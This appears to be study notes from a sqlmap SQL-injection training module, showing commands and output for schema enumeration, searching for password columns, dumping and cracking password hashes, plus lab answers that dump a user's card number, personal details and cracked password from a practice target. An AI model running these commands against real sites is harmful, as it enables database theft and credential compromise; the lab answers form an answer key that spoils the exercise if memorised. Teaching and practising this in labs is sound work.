# Advanced Database Enumeration
## DB Schema Enumeration
If we wanted to retrieve the structure of all of the tables so that we can have a complete overview of the database architecture, we could use the switch `--schema`:

```shellsession
$ sqlmap -u "http://www.example.com/?id=1" --schema

...SNIP...
Database: master
Table: log
[3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| date   | datetime     |
| agent  | varchar(512) |
| id     | int(11)      |
+--------+--------------+

Database: owasp10
Table: accounts
[4 columns]
+-------------+---------+
| Column      | Type    |
+-------------+---------+
| cid         | int(11) |
| mysignature | text    |
| password    | text    |
| username    | text    |
+-------------+---------+
...
Database: testdb
Table: data
[2 columns]
+---------+---------+
| Column  | Type    |
+---------+---------+
| content | blob    |
| id      | int(11) |
+---------+---------+

Database: testdb
Table: users
[3 columns]
+---------+---------------+
| Column  | Type          |
+---------+---------------+
| id      | int(11)       |
| name    | varchar(500)  |
| surname | varchar(1000) |
+---------+---------------+
```

## Searching for Data
When dealing with complex database structures with numerous tables and columns, we can search for databases, tables, and columns of interest, by using the `--search` option. This option enables us to search for identifier names by using the `LIKE` operator. For example, if we are looking for all of the table names containing the keyword `user`:

```shellsession
$ sqlmap -u "http://www.example.com/?id=1" --search -T user

...SNIP...
[14:24:19] [INFO] searching tables LIKE 'user'
Database: testdb
[1 table]
+-----------------+
| users           |
+-----------------+

Database: master
[1 table]
+-----------------+
| users           |
+-----------------+

Database: information_schema
[1 table]
+-----------------+
| USER_PRIVILEGES |
+-----------------+

Database: mysql
[1 table]
+-----------------+
| user            |
+-----------------+

do you want to dump found table(s) entries? [Y/n] 
...SNIP...
```

We could also have tried to search for all column names based on a specific keyword (e.g. `pass`):

```shellsession
$ sqlmap -u "http://www.example.com/?id=1" --search -C pass

...SNIP...
columns LIKE 'pass' were found in the following databases:
Database: owasp10
Table: accounts
[1 column]
+----------+------+
| Column   | Type |
+----------+------+
| password | text |
+----------+------+

Database: master
Table: users
[1 column]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| password | varchar(512) |
+----------+--------------+

Database: mysql
Table: user
[1 column]
+----------+----------+
| Column   | Type     |
+----------+----------+
| Password | char(41) |
+----------+----------+

Database: mysql
Table: servers
[1 column]
+----------+----------+
| Column   | Type     |
+----------+----------+
| Password | char(64) |
+----------+----------+
```

## DB Users Password Enumeration and Cracking

```shellsession
$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

## Questions 
1. What's the name of the column containing "style" in it's name? (Case #1) **Answer: PARAMETER_STYLE**
   - Search for column containing "style":
        ```shellsession
        $ sqlmap -u 'http://154.57.164.69:32239/case1.php?id=1*' --batch --level 5 --risk 3 --threads 10 --search -C style
        <SNIP>
        columns LIKE 'style' were found in the following databases:
        Database: information_schema
        Table: ROUTINES
        [1 column]
        +-----------------+------------+
        | Column          | Type       |
        +-----------------+------------+
        | PARAMETER_STYLE | varchar(8) |
        +-----------------+------------+
        <SNIP>
        ```
2. What's the Kimberly user's password? (Case #1) **Answer: Enizoom1609**
   - Dump the users table with where condition and crack the password automatically:
        ```shellsession
        $ sqlmap -u 'http://154.57.164.69:32239/case1.php?id=1*' --batch --level 5 --risk 3 --threads 10 -T users --where="name LIKE '%kimberly%'" --dump
        Database: testdb                                                                                                                                                                                                                                       
        Table: users
        [1 entry]
        +----+------------------+---------------------------+--------------+-----------------+------------------+--------------+--------------------------------------------------------+---------------+
        | id | cc               | email                     | phone        | name            | address          | birthday     | password                                               | occupation    |
        +----+------------------+---------------------------+--------------+-----------------+------------------+--------------+--------------------------------------------------------+---------------+
        | 6  | 5143241665092174 | KimberlyMWright@gmail.com | 440-232-3739 | Kimberly Wright | 3136 Ralph Drive | June 18 1972 | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609) | Electrologist |
        +----+------------------+---------------------------+--------------+-----------------+------------------+--------------+--------------------------------------------------------+---------------
        ```
